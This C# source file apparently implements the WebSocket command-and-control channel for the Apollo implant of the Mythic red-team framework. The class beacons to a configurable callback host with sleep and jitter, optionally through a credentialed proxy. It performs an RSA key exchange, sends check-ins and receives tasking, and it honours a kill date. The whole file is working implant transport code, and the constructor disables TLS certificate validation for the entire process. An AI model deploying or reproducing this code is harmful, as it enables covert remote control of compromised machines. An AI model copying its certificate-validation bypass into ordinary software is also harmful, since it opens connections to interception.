using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using WebSocketSharp;
using ApolloInterop.Types.Delegates;
using System.Net;
using ApolloInterop.Enums.ApolloEnums;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Constants;
using System.Threading.Tasks;
using System.Collections.Concurrent;
using ST = System.Threading.Tasks;
using System.Threading;
using ApolloInterop.Serializers;
using ApolloInterop.Classes.Core;
using ApolloInterop.Classes.Events;
using WebsocketTransport.Models;

namespace WebsocketTransport
{
    public class WebsocketProfile : C2Profile, IC2Profile
    {
        internal WebSocket Client;

        private int CallbackInterval;
        private double CallbackJitter;
        private int CallbackPort;
        private string CallbackHost;
        private string PostUri;
        // synthesis of CallbackHost, CallbackPort, PostUri
        private string Endpoint;
        private bool EncryptedExchangeCheck;
        private string ProxyHost;
        private string ProxyPort;
        private string ProxyUser;
        private string ProxyPass;
        private string KillDate;
        // synthesis of ProxyHost and ProxyPort
        private string ProxyAddress;
        private Dictionary<string, string> _additionalHeaders = new Dictionary<string, string>();
        private bool _uuidNegotiated = false;
        private bool _keyExchanged = false;
        private RSAKeyGenerator rsa = null;
        private static ConcurrentQueue<byte[]> senderQueue = new ConcurrentQueue<byte[]>();
        private ST.Task agentConsumerTask = null;
        private ST.Task agentProcessorTask = null;
        private static JsonSerializer jsonSerializer = new JsonSerializer();
        private static AutoResetEvent senderEvent = new AutoResetEvent(false);
        private static ConcurrentQueue<IMythicMessage> recieverQueue = new ConcurrentQueue<IMythicMessage>();
        private static AutoResetEvent receiverEvent = new AutoResetEvent(false);
        private Action sendAction;
        private Dictionary<WebSocket, ST.Task> writerTasks = new Dictionary<WebSocket, ST.Task>();
        private string Uuid = "";

        public WebsocketProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
        {
            CallbackInterval = int.Parse(data["callback_interval"]);
            CallbackJitter = double.Parse(data["callback_jitter"]);
            CallbackPort = int.Parse(data["callback_port"]);
            CallbackHost = data["callback_host"];
            Uuid = agent.GetUUID();
            PostUri = data["post_uri"];
            EncryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
            ProxyHost = data["proxy_host"];
            ProxyPort = data["proxy_port"];
            rsa = agent.GetApi().NewRSAKeyPair(4096);
            if (!string.IsNullOrEmpty(ProxyPort))
            {
                ProxyAddress = string.Format("{0}:{1}", ProxyHost, ProxyPort);
            }
            else
            {
                ProxyAddress = ProxyHost;
            }

            if (PostUri[0] != '/')
            {
                PostUri = $"/{PostUri}";
            }
            Endpoint = string.Format("{0}:{1}", CallbackHost, CallbackPort);
            ProxyUser = data["proxy_user"];
            ProxyPass = data["proxy_pass"];
            KillDate = data["killdate"];

            string[] reservedStrings = new[]
            {
                "callback_interval",
                "callback_jitter",
                "callback_port",
                "callback_host",
                "post_uri",
                "encrypted_exchange_check",
                "proxy_host",
                "proxy_port",
                "proxy_user",
                "proxy_pass",
                "killdate",
            };

            foreach (string k in data.Keys)
            {
                if (!reservedStrings.Contains(k))
                {
                    _additionalHeaders.Add(k, data[k]);
                }
            }

            // Disable certificate validation on web requests
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;

            Agent.SetSleep(CallbackInterval, CallbackJitter);
            sendAction = () =>
            {
                while (Client.IsAlive)
                {
                    senderEvent.WaitOne();
                    if (senderQueue.TryDequeue(out byte[] result))
                    {
                        Console.WriteLine("Sending: " + Encoding.UTF8.GetString(result));
                        Client.Send(result);
                    }
                }
            };
        }

        private void Pull()
        {
            agentProcessorTask = new ST.Task(() =>
            {
                while (Agent.IsAlive())
                {
                    Recv(MessageType.MessageResponse, delegate (IMythicMessage msg)
                    {
                        return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg);
                    });
                }
            });

            agentProcessorTask.Start();

            while (Agent.IsAlive())
            {
                Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage tm)
                {
                    AddToSenderQueue(tm);
                    return true;
                });
                Agent.Sleep();
            }
        }

        public void Start()
        {
            Pull();
        }


        public bool IsOneWay()
        {
            return false;
        }

        public bool Send<T>(T message)
        {
            throw new Exception("WebsocketProfile does not support Send only.");
        }

        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp)
        {
            while (Agent.IsAlive())
            {
                receiverEvent.WaitOne();
                IMythicMessage msg = recieverQueue.FirstOrDefault(m => m.GetTypeCode() == mt);
                if (msg != null)
                {
                    recieverQueue = new ConcurrentQueue<IMythicMessage>(recieverQueue.Where(m => m != msg));
                    return onResp(msg);
                }
                if (!Connected)
                    break;
            }
            return true;
        }

        public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
        {
            throw new NotImplementedException();
        }

        // Only really used for bind servers so this returns empty
        public bool Connect()
        {
            return true;
        }

        public bool IsConnected()
        {
            return Connected;
        }

        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
        {
            if (Client == null)
            {
                Client = new WebSocket(Endpoint + PostUri);

                if (!string.IsNullOrEmpty(ProxyAddress))
                {
                 
                   Client.SetProxy("http://"+ProxyAddress, ProxyUser, ProxyPass);
                }
                else
                {
                    //TODO TEST
                    // Use Default Proxy and Cached Credentials for Internet Access
                    IWebProxy wr = WebRequest.GetSystemWebProxy();
                    ICredentials cr = CredentialCache.DefaultCredentials;
                }

                Client.ConnectAsync();
                Client.OnOpen += OnAsyncConnect;
                Client.OnMessage += OnAsyncMessageReceived;
                Client.OnClose += OnAsyncDisconnect;
            }

            if (EncryptedExchangeCheck && !_uuidNegotiated)
            {
                EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
                {
                    Action = "staging_rsa",
                    PublicKey = this.rsa.ExportPublicKey(),
                    SessionID = this.rsa.SessionId
                };
                AddToSenderQueue(handshake1);

                if (!Recv(MessageType.EKEHandshakeResponse, delegate (IMythicMessage resp)
                {
                    EKEHandshakeResponse respHandshake = (EKEHandshakeResponse)resp;
                    byte[] tmpKey = rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                    ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                    ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
                    _keyExchanged = true;
                    return true;
                }))
                {
                    return false;
                }
            }

            AddToSenderQueue(checkinMsg);
            if (agentProcessorTask == null || agentProcessorTask.IsCompleted)
            {
                return Recv(MessageType.MessageResponse, delegate (IMythicMessage resp)
                {
                    MessageResponse mResp = (MessageResponse)resp;
                    if (!_uuidNegotiated)
                    {
                        _uuidNegotiated = true;
                        ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
                        checkinMsg.UUID = mResp.ID;
                    }
                    Connected = true;
                    return onResp(mResp);
                });
            }
            else
            {
                return true;
            }
        }

        private bool AddToSenderQueue(IMythicMessage msg)
        {
            WebSocketMessage m = new WebSocketMessage()
            {
                client = true,
                data = "",
                tag = String.Empty
            };
            if (_keyExchanged)
            {
                m.data = Serializer.Serialize(msg);
            }
            else
            {
                m.data = Convert.ToBase64String(Encoding.UTF8.GetBytes(Uuid + jsonSerializer.Serialize(msg)));
            }
            string message = jsonSerializer.Serialize(m);
            senderQueue.Enqueue(Encoding.UTF8.GetBytes(message));

            senderEvent.Set();
            return true;
        }

        private void OnAsyncDisconnect(object sender, CloseEventArgs args)
        {
            Console.WriteLine("OnAsyncDisconnect");
        }

        private void OnAsyncMessageReceived(object sender, MessageEventArgs args)
        {
            Console.WriteLine("OnAsyncMessageReceived");
            Console.WriteLine(args.Data);

            WebSocketMessage wsm = WebsocketJsonContext.Deserialize<WebSocketMessage>(args.Data);

            string decodedData = Encoding.UTF8.GetString(Convert.FromBase64String(wsm.data)).Substring(36);

            if (EncryptedExchangeCheck)
            {
                if (!_keyExchanged)
                {
                    recieverQueue.Enqueue(jsonSerializer.Deserialize<EKEHandshakeResponse>(decodedData));
                }
                else
                {
                    recieverQueue.Enqueue(Serializer.Deserialize<MessageResponse>(wsm.data));
                }
            }
            else
            {
                recieverQueue.Enqueue(jsonSerializer.Deserialize<MessageResponse>(decodedData));
            }

            receiverEvent.Set();
        }


        private void OnAsyncConnect(object sender, EventArgs args)
        {
            if (writerTasks.Count > 0)
            {
                Client.Close();
                return;
            }

            ST.Task tmp = new ST.Task(sendAction);
            writerTasks[Client] = tmp;
            writerTasks[Client].Start();
            Connected = true;
        }
    }
}
